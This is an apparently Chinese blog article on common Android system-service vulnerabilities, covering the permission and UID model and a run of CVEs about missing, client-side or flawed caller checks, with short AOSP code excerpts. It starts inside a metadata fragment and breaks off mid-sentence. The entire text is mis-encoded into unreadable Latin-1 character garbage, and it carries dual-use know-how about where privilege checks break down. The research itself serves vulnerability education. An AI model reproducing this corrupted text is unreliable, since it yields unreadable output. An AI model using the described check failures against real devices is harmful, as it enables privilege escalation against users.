ç³»ç»Ÿå±‚å¸¸è§å®‰å…¨æ¼æ´çš„äººã€‚ç¥å¤§å®¶å†™ä»£ç æ—  bugï¼ŒæŒ–æ´å¤©å¤©æŒ–åˆ° Critical RCE æ¼æ´é“¾ã€‚æœ¬æ–‡å¼€å§‹åˆ›ä½œæ—¶é—´ï¼š2024-02-19 å®Œæˆæ—¶é—´ï¼š2024-02-29 å‘å¸ƒæ—¶é—´ï¼š2024-11-05","text":"æœ¬æ–‡é€‚ç”¨äºå·²å¯¹ Android å¼€å‘æœ‰åŸºç¡€äº†è§£ï¼Œå¸Œæœ›äº†è§£ Android ç³»ç»Ÿå±‚å¸¸è§å®‰å…¨æ¼æ´çš„äººã€‚ç¥å¤§å®¶å†™ä»£ç æ—  bugï¼ŒæŒ–æ´å¤©å¤©æŒ–åˆ° Critical RCE æ¼æ´é“¾ã€‚æœ¬æ–‡å¼€å§‹åˆ›ä½œæ—¶é—´ï¼š2024-02-19 å®Œæˆæ—¶é—´ï¼š2024-02-29 å‘å¸ƒæ—¶é—´ï¼š2024-11-05è¿‡å¹´äº†ï¼Œä¸è¦å†è®¨è®ºä»€ä¹ˆ CVEã€CNVDã€CNNVD ä¹‹ç±»çš„äº†ã€‚ä½ çš„æ¼æ´ä»¬ä¸èƒ½ç»™ä½ å¸¦æ¥ä»»ä½•å®è´¨æ€§ä½œç”¨ï¼Œæœ‹å‹ä»¬å…œé‡Œæå‡ºä¸€å¤§æŠŠé’±åƒå–ç©ä¹ï¼Œä½ é»˜é»˜çš„åœ¨å®¶é‡Œæ‰“å¼€ä½ çš„ Test PLMN ã€‚äº²å¨æœ‹å‹åƒé¥­é—®ä½ æ”¶è·äº†ä»€ä¹ˆï¼Œä½ è¯´æˆ‘çš„æ¼æ´è¢«è°·æ­Œè¯„çº§é«˜å±äº†ï¼ŒAndroid 14 æœ€æ–°å®‰å…¨è¡¥ä¸éƒ½èƒ½ç”¨ï¼Œäº²æˆšä»¬æ‡µé€¼äº†ï¼Œä½ è¿˜åœ¨å¿ƒé‡Œé»˜é»˜å˜²ç¬‘ä»–ä»¬ï¼Œç¬‘ä»–ä»¬ä¸æ‡‚ä½ çš„ BALï¼Œä¸æ‡‚ä»€ä¹ˆæ˜¯ BG-FGSï¼Œä¸æ‡‚æ€ä¹ˆåˆ©ç”¨ confused deputy ç±»å‹æ¼æ´è¿›è¡Œè·¨ç”¨æˆ·è¯»å–ï¼Œä¸æ‡‚ LaunchAnywhereï¼Œä¸æ‡‚ PendingIntent è¦ FLAG_IMMUTABLEï¼Œç¬‘ä»–ä»¬æ‰‹æœºä¸Šçš„æ‹¼å¤šå¤šã€‚ä½ çˆ¶æ¯çš„åŒäº‹éƒ½åœ¨è¯´è‡ªå·±çš„å­å¥³ä¸€å¹´çš„æ”¶è·ï¼Œå„¿å­ä¹°äº†ä¸ªæˆ¿ï¼Œå¥³å„¿ä¹°äº†ä¸ªè½¦ï¼Œå§‘å¨˜å‡èŒåŠ è–ªäº†ï¼Œä½ çš„çˆ¶æ¯é»˜é»˜æ— è¨€ï¼Œè¯´æˆ‘çš„å¥³å„¿å¤©å¤©åœ¨å®¶é‡Œå¯¹ç€ç”µè„‘ä¸Šçš„ä¸€å †è‹±æ–‡å‘å‘†ï¼Œå˜´é‡Œå¿µå¨è°·æ­Œæ€ä¹ˆè¿˜ä¸å›æˆ‘ï¼Œæœ‰æ—¶å€™è¿˜ç»™æˆ‘ä»¬å‘ä¸€å †ä¹±ç çš„æ–‡ä»¶ã€‚æƒé™ï¼Œæ²¡æœ‰ä½ æˆ‘æ€ä¹ˆæ´»å•Šæƒé™Android æƒé™æœºåˆ¶æ¦‚è¿°æƒé™è‚¯å®šæ˜¯æ¯ä¸ª Android å¼€å‘è€…éƒ½ç”¨è¿‡çš„ä¸œè¥¿ï¼Œæ¯”å¦‚åº”ç”¨è¦è®¿é—®ç½‘ç»œï¼Œå°±è¦åƒè¿™æ ·åŠ ä¸Šç½‘ç»œæƒé™ï¼š1&lt;uses-permission android:name=\"android.permission.INTERNET\" /&gt;æ¯ä¸ªåº”ç”¨åœ¨è¢«å®‰è£…æ—¶éƒ½ä¼šè¢«èµ‹äºˆä¸€ä¸ª UIDï¼ŒåŒ…æ‹¬ç³»ç»Ÿåº”ç”¨ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ¯ä¸ªåº”ç”¨éƒ½ä¼šæœ‰ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„ UIDï¼Œé™¤éåº”ç”¨ä½¿ç”¨ sharedUserId ä¸å…¶ä»–åº”ç”¨å…±äº« UIDï¼ˆè¿™é‡Œå¿½ç•¥é…ç½®äº† isolatedProcess=true çš„æœåŠ¡è¿›ç¨‹ï¼Œå®ƒä»¬ä½¿ç”¨éšæœº UID ä¸”å‡ ä¹æ²¡æœ‰ä»»ä½•æƒé™ï¼‰ã€‚Android ç³»ç»Ÿå†…éƒ¨ä¹Ÿä½¿ç”¨ UID åŒºåˆ†è°ƒç”¨è€…ã€‚Android ä¸­é€šè¿‡ getSystemService() å¯ä»¥æ‹¿åˆ°ä¸€å †çš„ XxxManagerï¼Œè€Œå‡ ä¹æ‰€æœ‰çš„è¿™äº› XxxManager éƒ½ä¼šå’Œ system_server æš´éœ²å‡ºæ¥çš„ä¸€ä¸ª XxxManagerService è¿›è¡Œäº¤äº’ã€‚åº”ç”¨è°ƒç”¨è¿™äº›ç³»ç»ŸæœåŠ¡æä¾›çš„æ¥å£æ—¶ï¼Œå¦‚æœéœ€è¦æƒé™ï¼Œç³»ç»Ÿä¼šé¦–å…ˆæ ¡éªŒæƒé™ã€‚ä»¥æ¥å£ ConnectivityManager.getActiveNetwork() ä¸ºä¾‹ï¼Œå®ƒéœ€è¦ android.permission.ACCESS_NETWORK_STATE è¿™ä¸ªæƒé™ï¼Œæ‰€ä»¥ ConnectivityService å°±ä¼šä¸»åŠ¨æ ¡éªŒè¿™ä¸ªæƒé™ï¼š123456789101112private void enforceAccessPermission() &#123; mContext.enforceCallingOrSelfPermission( android.Manifest.permission.ACCESS_NETWORK_STATE, \"ConnectivityService\");&#125;@Override@Nullablepublic Network getActiveNetwork() &#123; enforceAccessPermission(); return getActiveNetworkForUidInternal(mDeps.getCallingUid(), false);&#125;è¿™é‡Œçš„ enforceCallingOrSelfPermission å†…éƒ¨å°±ä¼šè°ƒç”¨ Binder.getCallingUid() æ‹¿åˆ°è°ƒç”¨è€…çš„ UID ç„¶åæ£€æŸ¥è¿™ä¸ª UID æ˜¯å¦å…·æœ‰å¯¹åº”æƒé™ã€‚æ‰€ä»¥å®é™…ä¸Šï¼Œé‰´æƒç”¨çš„æ˜¯è°ƒç”¨è€… UID è€Œä¸æ˜¯åŒ…åã€‚æƒé™è¿˜æœ‰ä¸€ç§ç‰¹æ®Šç±»å‹ï¼Œå«åšç‰¹æ®Šæƒé™ï¼Œå®šä¹‰æ—¶åœ¨ protectionLevel ä¸­åŠ å…¥ appop çš„å°±æ˜¯ã€‚ç‰¹æ®Šæƒé™æè¿°ä¸€ç»„å¯¹ç³»ç»Ÿæœ‰ç‰¹æ®Šæ„ä¹‰çš„æƒé™ï¼Œå¦‚æ‚¬æµ®çª—æƒé™å’Œä¿®æ”¹ç³»ç»Ÿè®¾ç½®æƒé™ã€‚è®¾ç½®ä¸­æœ‰ä¸€ä¸ªâ€œç‰¹æ®Šåº”ç”¨æƒé™â€çš„é¡µé¢ä¸“é—¨ç”¨æ¥æ§åˆ¶è¿™äº›ç‰¹æ®Šæƒé™ã€‚è¦æ£€æŸ¥è¿™äº›ç‰¹æ®Šæƒé™çš„æˆæƒçŠ¶æ€éœ€è¦ç”¨åˆ° AppOpsManagerã€‚ç³»ç»Ÿä¸­è¿˜æœ‰å¾ˆå¤šåˆ«çš„å®‰å…¨æœºåˆ¶ï¼Œå¦‚ SELinuxã€capability å’Œ seccompã€‚è¿™é‡Œç•¥è¿‡ä¸è®²ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡Œæœç´¢ã€‚æƒ³è¦ä»¥ä¸€ä¸ªç³»ç»Ÿå¼€å‘è€…çš„èº«ä»½äº†è§£æ›´å¤šå…³äºæƒé™çš„çŸ¥è¯†ï¼Œå¯ä»¥æŸ¥çœ‹è°·æ­Œå®˜æ–¹è¯´æ˜æ–‡æ¡£ï¼šAndroid permissions for system developerså¸¸è§æ¼æ´ç±»å‹ï¼šä¸»åŠ¨é‰´æƒä¸å½“CVE-2023-40094ï¼šé‰´æƒç¼ºå¤±è¡¥ä¸é“¾æ¥ï¼šRequire permission to unlock keyguardæ­¤ç§ç±»å‹çš„æ¼æ´å¯è°“æ˜¯æœ€ç®€å•æœ€ç»å…¸çš„æ¼æ´ï¼Œå¯¹ Android æƒé™æ¨¡å‹è¶³å¤Ÿç†Ÿæ‚‰çš„äººå¯èƒ½çœ‹ä¸€çœ¼å°±èƒ½çŸ¥é“æœ‰é—®é¢˜ï¼Œä¸”æ¼æ´å±å®³æ€§å¾€å¾€è¾ƒé«˜ï¼Œå¦‚æ­¤ä¾‹çš„ CVE-2023-40094ï¼Œå…è®¸ä»»æ„ app è°ƒç”¨ç‰¹æƒ API æ— å¯†ç è§£é™¤é”å±ï¼ŒGoogle ä¹Ÿç»™å‡ºäº†é«˜å±è¯„çº§ã€‚è¿™ç§æ¼æ´ç®€å•ä½†å¯é‡ä¸å¯æ±‚ï¼Œè¦åœ¨ AOSP ä¸Šç™¾ GB çš„æºç ä»“åº“ä¸­å‘ç°æœªè¢«é€‚å½“ä¿æŠ¤çš„ç‰¹æƒ APIï¼Œå¯è°“æ˜¯å¤§æµ·æé’ˆï¼Œæåˆ°ä¸€ä¸ªç™½å«–ä¸€ä¸ª CVEï¼Œå·ç€ä¹å»ã€‚è¿‘å‡ ä¸ªæœˆå®‰å…¨è¡¥ä¸ä¸­å¤§æ¦‚ 1~3 ä¸ªæœˆå°±ä¼šæœ‰è¿™ç§æ¼æ´è¢«å…¬å¼€ï¼Œè¯´æ˜è¿™ç§æ¼æ´å¯èƒ½è¿˜å­˜åœ¨ä¸å°‘ï¼Œå¯èƒ½é›†ä¸­åœ¨æ–°åŠ çš„ API å’Œè¢«é‡æ„è¿‡çš„æœåŠ¡ä¸­ï¼Œè¿˜æœ‰å„ä¸ª OEM æ·»åŠ çš„è‡ªå®šä¹‰ APIã€‚CVE-2021-0554ï¼šé‰´æƒåœ¨å®¢æˆ·ç«¯è¡¥ä¸é“¾æ¥ï¼šEnforce BACKUP permission on Service end.Android å¾ˆå¤šç³»ç»ŸæœåŠ¡å‘åº”ç”¨æš´éœ²äº†è‡ªå·±çš„æ¥å£ï¼Œå…è®¸åº”ç”¨è°ƒç”¨ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œåº”ç”¨è¿™è¾¹ä½¿ç”¨çš„ API å« XxxManagerï¼Œsystem_server é‡Œä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„ XxxManagerServiceã€‚åº”ç”¨è¿™è¾¹çš„ XxxManager åŸºæœ¬ä¸Šä»€ä¹ˆéƒ½ä¸å¹²ï¼Œå°±åªæ˜¯è°ƒç”¨ system_server é‡Œçš„ XxxManagerService è€Œå·²ï¼ŒçœŸæ­£å¹²æ´»çš„æ˜¯ XxxManagerServiceã€‚å‘ç°äº†ä»€ä¹ˆå—ï¼Ÿä»¥ ActivityManager ä¸ºä¾‹ï¼Œè™½ç„¶ ActivityManager å’Œ ActivityManagerService éƒ½æ˜¯ç³»ç»Ÿçš„ç±»ï¼Œä½†æ˜¯åº”ç”¨è°ƒç”¨ API çš„æ—¶å€™ï¼ŒActivityManager è¿™ä¸ªç±»é‡Œçš„ä»£ç æ˜¯è¿è¡Œåœ¨è°ƒç”¨è€…è¿›ç¨‹çš„ï¼Œåªæœ‰ ActivityManagerService æ˜¯åœ¨ç³»ç»Ÿè¿›ç¨‹çš„ï¼åœ¨è°ƒç”¨è€…è¿›ç¨‹æ„å‘³ç€è°ƒç”¨è€…å¯ä»¥éšä¾¿å¹²æ‰°ï¼Œæ‰€ä»¥æ‰€æœ‰é‰´æƒæ“ä½œéƒ½åº”è¯¥æ”¾åœ¨ç³»ç»Ÿè¿›ç¨‹é‡Œçš„ ActivityManagerService ä»¥é¿å…è¢«å¹²æ‰°ã€‚è€Œåœ¨è¿™ä¸ªæ¼æ´ä¸­ï¼Œä»£ç åˆšå¥½å†™åäº†ï¼Œapp è°ƒç”¨ BackupManager çš„æ—¶å€™ï¼ŒBackupManager åœ¨å½“å‰è¿›ç¨‹æ£€æŸ¥ä¸€éæƒé™ï¼Œè€ŒBackupManagerService ä¸­çš„æ¥å£å´æ²¡æœ‰è¢«ä¿æŠ¤ã€‚æ— è®ºæ˜¯åˆ©ç”¨åå°„ã€hookï¼Œæˆ–è€…ç›´æ¥è°ƒç”¨ IBackupManager éƒ½å¯ä»¥è½»æ˜“ç»•è¿‡æƒé™æ£€æŸ¥ã€‚è¿™ä¸ªå…¶å®å’Œä¸Šä¸€ä¸ªæ²¡ä»€ä¹ˆåŒºåˆ«äº†ï¼Œæ²¡æœ‰äººè¿™ä¹ˆå†™ä»£ç ï¼Œè¿‘å‡ å¹´ä¹Ÿæ²¡å†çœ‹è§è¿‡ç±»ä¼¼æ¼æ´ï¼Œå‚è€ƒä»·å€¼ä¸å¤§ï¼Œçº¯å½“ä¹å­çœ‹å°±å¥½ã€‚CVE-2015-6624 &amp; CVE-2015-6625ï¼šç‰¹æ®Šæ¥å£ dumpCVE-2015-6624 è¡¥ä¸ï¼šAdd DUMP permission check to ResourceManagerService.CVE-2015-6625 è¡¥ä¸ï¼šAdd DUMP permission check to WifiScanner service.è¿™ä¸¤ä¸ªæ¼æ´æœ¬è´¨ä¸Šéƒ½è¿˜æ˜¯æ¥å£ç¼ºæƒé™æ ¡éªŒï¼Œä½†æ¼æ´ç‚¹ä½äºç‰¹æ®Šæ¥å£ dump å†…ã€‚dump æ˜¯ binder å†…ç½®çš„æ¥å£ï¼Œå¾ˆå°‘è¢«å¼€å‘è€…æ³¨æ„åˆ°ï¼Œä»…ç”¨äºåœ¨è°ƒè¯•æ—¶ï¼ˆå¦‚ dumpsys æˆ– cmd xxx dumpï¼‰è¾“å‡ºä¿¡æ¯ã€‚ä¸ºäº†ä¿æŠ¤è¿™äº›æ•æ„Ÿæ•°æ®ï¼Œè°ƒç”¨è€…åº”è¯¥å…·æœ‰ android.permission.DUMP æƒé™ï¼Œè€Œå¤§éƒ¨åˆ†æ¥å£ä¹Ÿç¡®å®æ£€æŸ¥äº†æƒé™ï¼Œä½†ä»ç„¶ä¸æ’é™¤æœ‰å¼€å‘è€…å¤±è¯¯çš„æƒ…å†µã€‚è¯†åˆ«è¿™ç§æ¼æ´å¯ä»¥å°è¯•ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·ï¼Œå¤šè®¾å¤‡æ‰¹é‡å¯¹æ‰€æœ‰ç³»ç»ŸæœåŠ¡è¿›è¡Œæµ‹è¯•ã€‚ä¸è¿‡ç°åœ¨ CTS æµ‹è¯•ä¼šç¡®ä¿æ²¡æƒé™çš„æ—¶å€™è°ƒç”¨ dump ä»»ä½•æœåŠ¡éƒ½ä¸ä¼šè¿”å›æ­£ç¡®ä¿¡æ¯ï¼Œæ‰€ä»¥åº”è¯¥ä¹Ÿæ²¡ä»€ä¹ˆæŒ–æ˜ä»·å€¼ã€‚CVE-2020-0109ï¼šç‰¹æ®Šæ¥å£ shellCommandè¡¥ä¸é“¾æ¥ï¼šFix notification shell commandså’Œä¸Šä¸€æ¡ç±»ä¼¼ï¼Œä¸è¿‡è¿™é‡Œæ˜¯ç‰¹æ®Šæ¥å£ shellCommandï¼Œè¯¥æ¥å£ç”¨äº adb shell å‘½ä»¤è¡Œè°ƒè¯•æ—¶è°ƒç”¨ cmd xxx yyyã€‚å’Œä¸Šä¸€æ¡çš„ dump ç›¸æ¯”ï¼Œè¿™ä¸€é¡¹æ›´ä¸ºå¤æ‚ä¸€ç‚¹ï¼šBinder.java ä¸­é»˜è®¤çš„ onShellCommand å®ç°ä¼šä¿è¯è°ƒç”¨è€… UID ä¸º root æˆ– shellï¼Œä¸æ»¡è¶³ç›´æ¥æ‹’ç»ï¼Œç„¶åè°ƒç”¨ handleShellCommand å®ç°å…·ä½“æ“ä½œï¼Œä½† AOSP ä¸­å­˜åœ¨å¤§é‡æœåŠ¡ç±»ç›´æ¥é‡å†™äº† onShellCommand è€Œé handleShellCommandï¼Œä½¿å¾—è¿™ä¸ªæ ¡éªŒè¢«è·³è¿‡ï¼›å³ä½¿æœåŠ¡æ²¡æœ‰ä½¿ç”¨ handleShellCommandï¼Œå¦‚æœ onShellCommand å†…æ­£ç¡®æ£€æŸ¥äº†è°ƒç”¨è€…æƒé™æˆ–è°ƒç”¨è€… UIDï¼Œé‚£ä¹Ÿæ˜¯å®‰å…¨çš„ï¼›å³ä½¿æœªç›´æ¥æ£€æŸ¥è°ƒç”¨è€…æƒé™ï¼Œå¦‚æœ ShellCommand å†…è°ƒç”¨çš„éƒ½æ˜¯ä¼šæ£€æŸ¥æƒé™çš„å…¬å¼€æ¥å£ï¼ˆä¸”æ²¡æœ‰ clear calling idï¼‰ï¼Œé‚£ä¹Ÿå¯ä»¥è®¤ä¸ºå®‰å…¨ã€‚åœ¨è¿™ä¸ªæ¼æ´ä¸­ï¼Œéƒ¨åˆ†æ“ä½œæœªæ­£ç¡®æ£€æŸ¥è°ƒç”¨è€…æƒé™ï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥æ— æƒé™è°ƒç”¨ç³»ç»Ÿå†…éƒ¨ç§æœ‰æ¥å£é€ æˆæ¼æ´ã€‚æˆ‘å‘ç°çš„ CVE-2024-31318 å°±å±äºè¿™ç§æ¼æ´ã€‚è¿™ç§æ¼æ´è¿‘å‡ å¹´ä¹Ÿä¸å¤šè§ï¼Œäº†è§£ä¸€ä¸‹å°±è¡Œã€‚CVE-2021-0683ï¼šä¸æ­£ç¡®çš„ ShellCommand å®ç°è¡¥ä¸é“¾æ¥ï¼šFix side effects of trace-ipc and dumpheap commandsæœ¬ä¾‹ä¸­ï¼ŒActivityManagerShellCommand ä¼šåœ¨ ActivityManagerService.onShellCommand ä¸­è¢«è°ƒç”¨ï¼Œæ‰€ä»¥è¿™é‡Œçš„ä»£ç è¿è¡Œåœ¨ system_server è¿›ç¨‹ï¼Œæœ‰ç€ç³»ç»Ÿæƒé™ï¼Œç›´æ¥è°ƒç”¨ file.delete() æ˜¯ä»¥ç³»ç»Ÿç‰¹æƒæ‰§è¡Œçš„ï¼Œè€Œå¾ˆæ˜æ˜¾åŸæœ¬è°ƒç”¨è€…ä¸åº”è¯¥æœ‰åˆ é™¤ç³»ç»Ÿæ–‡ä»¶çš„æƒé™ï¼Œé€ æˆæ¼æ´ã€‚å¯èƒ½ä½ ä¼šè¯´ï¼Œå°±ç®—ä¸åˆ é™¤æ–‡ä»¶ï¼Œåº•ä¸‹ system_server ä¸€æ ·è¦æ‰“å¼€è¿™ä¸ªæ–‡ä»¶æ‰èƒ½å¾€é‡Œå†™å…¥å†…å®¹å•Šï¼Œè¿™ä¸æ˜¯ä¸€æ ·ä¼šè¦†ç›–åŸæ–‡ä»¶ï¼Ÿè¯·æ³¨æ„è¿™é‡Œä½¿ç”¨çš„æ˜¯ openFileForSystemï¼Œè¿™ä¸ªå‡½æ•°å®é™…ä¸Šä¸ä¼šè‡ªå·±æ‰“å¼€æ–‡ä»¶ï¼Œè€Œæ˜¯ä½¿ç”¨è°ƒç”¨è€…ä¼ é€’çš„ ShellCallbackï¼Œè®©è°ƒç”¨è€…è¿›ç¨‹æ‰“å¼€æ–‡ä»¶ç„¶åè¿”å›æ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥å®é™…ä¸Šè¿˜æ˜¯ç”¨è°ƒç”¨è€…æœ¬èº«çš„æƒé™ã€‚å…¶ä»–ç³»ç»ŸæœåŠ¡ä¸­ï¼Œç›´æ¥æ¥å—æ–‡ä»¶è·¯å¾„çš„æ¥å£ï¼ˆå¦‚ pm install /path/to/apkï¼‰ä¹Ÿéƒ½åº”è¯¥è¿™æ ·å®ç°ï¼Œé¿å…è¶Šæƒã€‚CVE-2021-0327 &amp; CVE-2021-0398ï¼šä¸€è¡Œ clearCallingIdentity å¼•å‘çš„æƒ¨æ¡ˆCVE-2021-0327 è¡¥ä¸ï¼šEnsure caller identity is restored in CP quick-path.CVE-2021-0398 è¡¥ä¸ï¼šSet mAllowWhileInUsePermissionInFgs correctly when bindService() from background.è¿˜è®°å¾—ä¸Šé¢æåˆ°çš„ Binder IPC é‰´æƒè¿‡ç¨‹å—ï¼ŸenforceCallingOrSelfPermission ç­‰ API å®é™…éƒ½æ˜¯ä¾èµ– Binder.getCallingUid() è¿”å›çš„è°ƒç”¨è€… UID è¿›è¡Œé‰´æƒçš„ï¼Œè€Œå¦ä¸€ä¸ª API clearCallingIdentity å…è®¸è®© getCallingUid è¿”å›è‡ªå·±çš„ UIDï¼Œä»¥æ­¤ç»•è¿‡éƒ¨åˆ†æƒé™æ£€æŸ¥ã€‚æœ‰æ—¶è¿™ç§è¡Œä¸ºæ˜¯æœ‰æ„ä¸”å®‰å…¨çš„ï¼Œè€Œæœ‰æ—¶åˆ™èƒ½é€ æˆå®‰å…¨æ¼æ´ã€‚Android å‘å±•åå‡ å¹´ï¼ŒAPI ä¹‹é—´çš„è°ƒç”¨å…³ç³»é”™ç»¼å¤æ‚ï¼Œå¦‚æœæœ‰ä¸€ç‚¹æ²¡è€ƒè™‘åˆ°ï¼Œå°±æœ‰å¯èƒ½é€ æˆæ¼æ´ã€‚è¦å‘ç°è¿™ç§æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨é™æ€ä»£ç åˆ†æå·¥å…·ï¼Œä½†ä»ç„¶éœ€è¦äººå·¥ä¸€ä¸ªä¸€ä¸ªç­›é€‰å¯ç”¨é¡¹ï¼Œè¿˜æ˜¯ä½“åŠ›æ´»ã€‚CVE-2015-6623ï¼šé‰´æƒï¼Œä½†æ˜¯æ‰‹æ»‘å†™é”™äº†è¡¥ä¸ï¼šAsk for system permission to enable ePNOå¤ªæˆå‰§äº†ä¸€çœ‹å°±æ‡‚ï¼Œåº”è¯¥ä¸ç”¨å¤šè¯´â€¦â€¦é™¤äº†çº¯ç²¹æ‰‹æ»‘ï¼Œè¿™ç§æ¼æ´æ¯”è¾ƒå¤šçš„å‡ºç°åœ¨å¤§ç‰ˆæœ¬è¿­ä»£è¡Œä¸ºå˜æ›´æ—¶ï¼Œæ”¹äº†ä¸€ä¸ªä½†æ˜¯æ²¡æ”¹å®Œçš„æƒ…å†µï¼Œå¦‚ CVE-2015-3833ï¼ŒAndroid 5.0 åºŸå¼ƒ getRecentsTask æ–¹æ³•ï¼Œåªåœ¨è°ƒç”¨è€…æ‹¥æœ‰ android.permission.REAL_GET_TASKS ç‰¹æƒæ—¶æ‰è¿”å›å…¶ä»–è¿›ç¨‹ä¿¡æ¯ï¼Œä½†æ˜¯ getRunningAppProcesses() æ²¡ä»»ä½•æƒé™æ£€æŸ¥ï¼Œè°ƒç”¨è¿™ä¸ªæ¥å£å¯ä»¥å˜ç›¸è¾¾æˆ getRecentsTask çš„æ•ˆæœã€‚CVE-2020-0107 &amp; CVE-2020-0246 &amp; CVE-2023-21092ï¼šè°ƒç”¨è€…ä¼ªé€  package nameCVE-2020-0107 è¡¥ä¸ï¼šCheck UID in getUiccCardsInfoSecurityCVE-2020-0246 è¡¥ä¸ï¼šAdd package checking with Uid in EuiccController#getEidCVE-2023-21092 è¡¥ä¸ï¼šChecking if package belongs to UID before registering broadcast receiverè™½ç„¶å¤§éƒ¨åˆ†æƒ…å†µä¸‹é‰´æƒåªéœ€è¦ä¸€æ¡ enforceCallingOrSelfPermissionï¼Œä½†æœ‰äº›æ—¶å€™ä»ç„¶éœ€è¦è°ƒç”¨è€…çš„åŒ…åï¼Œè€Œ Binder é»˜è®¤åªæ”¯æŒè¿”å›è°ƒç”¨è€…çš„ UID å’Œ PIDï¼ˆPID ä¸å¯é ï¼Œè°ƒç”¨è€…è°ƒç”¨åˆ°ä¸€åŠè¢«æ€äº†ï¼Œæˆ–è€…è°ƒç”¨è€…æŒ‡å®š FLAG_ONEWAY è¡¨ç¤ºæ­¤æ¬¡è°ƒç”¨æ˜¯å¼‚æ­¥è°ƒç”¨æ—¶ä¼šæ˜¯ 0ï¼‰ï¼Œå› æ­¤é‡ä¸Šè¿™ç§æƒ…å†µæ—¶ï¼Œé€šå¸¸éƒ½æ˜¯åœ¨å‚æ•°ä¸­åŠ ä¸€ä¸ª packageName è®©è°ƒç”¨è€…ä¼ é€’è‡ªå·±çš„åŒ…åã€‚æ³¨æ„è¿™é‡Œæ‰€è°“çš„ packageName æ˜¯è°ƒç”¨è€…ä¸»åŠ¨ä¼ é€’æ‰€ä»¥å®Œå…¨å—æ§äºè°ƒç”¨è€…ï¼ŒæœåŠ¡ç«¯å¿…é¡»æ£€æŸ¥ä¼ é€’çš„åŒ…åå±äºè°ƒç”¨è€… UIDï¼Œè€Œä¸‡ä¸€æœ‰ä¸€ä¸ªåœ°æ–¹ç²—å¿ƒå¤§æ„æ¼äº†ï¼Œå°±æœ‰å¯èƒ½é€ æˆæ¼æ´ã€‚å®é™…ä¸Šä¸åªæ˜¯ AOSPï¼ŒOEM ä»£ç ä¸­ä¹Ÿå‡ºç°è¿‡ç±»ä¼¼æ¼æ´ï¼Œå¦‚ä¸‰æ˜Ÿçš„ SVE-2021-23076 (CVE-2021-25510, CVE-2021-25511)ã€‚CVE-2021-0319ï¼šéªŒè¯è°ƒç”¨è€…åŒ…åï¼Œä½†æ˜¯æ²¡å®Œå…¨éªŒè¡¥ä¸ï¼šFix CDM package checkä¸Šå›ä¹¦è¯´åˆ°ï¼ŒæœåŠ¡ç«¯å¿…é¡»ä¿è¯è°ƒç”¨è€…ä¼ å…¥çš„åŒ…åå±äºè°ƒç”¨è€… UIDï¼Œè¿™ç§éªŒè¯ä¸€èˆ¬æœ‰ä¸‰ç§æ–¹å¼ï¼Œç¬¬ä¸€å¼ æ˜¯è°ƒç”¨ AppOpsManager.checkPackage()ï¼Œå®ƒåœ¨ä¸åŒ¹é…æ—¶ä¼šæŠ›å‡º SecurityExceptionï¼›ç¬¬äºŒç§æ˜¯ä¸»åŠ¨è°ƒç”¨ PackageManager.getPackageUid() ä¸ calling uid ç›¸æ¯”å¯¹ï¼Œç¬¬ä¸‰ç§æ˜¯é€šè¿‡ isSameAppã€‚åˆçœ‹æ¼æ´ä»£ç ï¼š12345678private void checkCallerIsSystemOr(String pkg, int userId) throws RemoteException &#123; if (isCallerSystem()) &#123; return; &#125; checkArgument(getCallingUserId() == userId, \"Must be called by either same user or system\"); mAppOpsManager.checkPackage(Binder.getCallingUid(), pkg);&#125;ç”¨äº†ä¸Šé¢æåˆ°çš„ç¬¬ä¸€ç§æ–¹å¼ï¼Œçœ‹èµ·æ¥å¥½åƒå¹¶æ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œå¯¹å§ï¼Ÿæˆ‘ä¸ªäººè§‰å¾—å³ä½¿æ˜¯éšä¾¿æ‰¾ä¸€ä¸ªå®‰å…¨ç ”ç©¶å‘˜ï¼Œè·Ÿä»–æ˜ç¡®è¯´è¿™ä¸ªæ–‡ä»¶é‡Œæœ‰æ ¡éªŒåŒ…åä¸æ­£ç¡®çš„æ¼æ´ï¼Œå¤§æ¦‚ç‡ä¹Ÿä¸ä¼šæœ‰äººç•™æ„è¿™é‡Œã€‚å…¶å®å…³é”®ç‚¹åœ¨è¿™é‡Œï¼š1private IAppOpsService mAppOpsManager;åˆ«è¢« mAppOpsManager è¿™ä¸ªåå­—éª—å•¦ï¼Œå®ƒçš„ç±»å‹ä¸æ˜¯ android.app.AppOpsManagerï¼Œè€Œæ˜¯å†…éƒ¨çš„ com.android.internal.app.IAppOpsServiceï¼è™½ç„¶å®ƒä»¬éƒ½æœ‰ checkPackage() æ–¹æ³•ï¼Œä½†æ˜¯å‰è€…åœ¨æ£€æŸ¥å¤±è´¥æ—¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œåè€…åªæ˜¯è¿”å›é”™è¯¯è€Œå·²ï¼å½“åˆè¿™æ®µä»£ç çš„ä½œè€…åº”è¯¥ä¹Ÿæ˜¯è§‰å¾—è‡ªå·±åœ¨ç”¨å‰è€…ï¼Œç»“æœå®é™…ä¸Šæ˜¯åè€…ï¼Œæ‰é€ æˆæ¼æ´ã€‚è¿™ç§æ¼æ´å¾ˆå°‘è§ï¼Œå¯ä»¥é€šè¿‡é™æ€ä»£ç æœç´¢æ‰¾åˆ°æ‰€æœ‰å¯¹ IAppOpsService.checkPackage() çš„è°ƒç”¨ç„¶åä¸€ä¸ªä¸ªæ£€æŸ¥ã€‚é‰´æƒè™½å¥½ï¼Œå¯ä¸è¦æ¼ä¿¡æ¯å“¦æ­¤ç±»æ¼æ´é€šå¸¸å½¢å¼ï¼šæ”»å‡»è€…ä¼ å…¥å…¶ä»–åº”ç”¨çš„åŒ…åï¼Œç„¶åé€šè¿‡å¾®å°çš„è¡Œä¸ºå·®å¼‚ç»•è¿‡ Android 11 ä¸­çš„â€œè½¯ä»¶åŒ…å¯è§æ€§â€ï¼ˆpackage visibilityï¼‰ åˆ¤æ–­æŒ‡å®šåº”ç”¨æ˜¯å¦å·²ç»å®‰è£…ã€‚ä¾‹å­1ï¼šCVE-2021-0321ï¼ŒgetPackageUid åœ¨å¯¹åº”åŒ…åä¸å­˜åœ¨æ—¶ä¼šè¿”å› Process.INVALID_UIDï¼Œå› 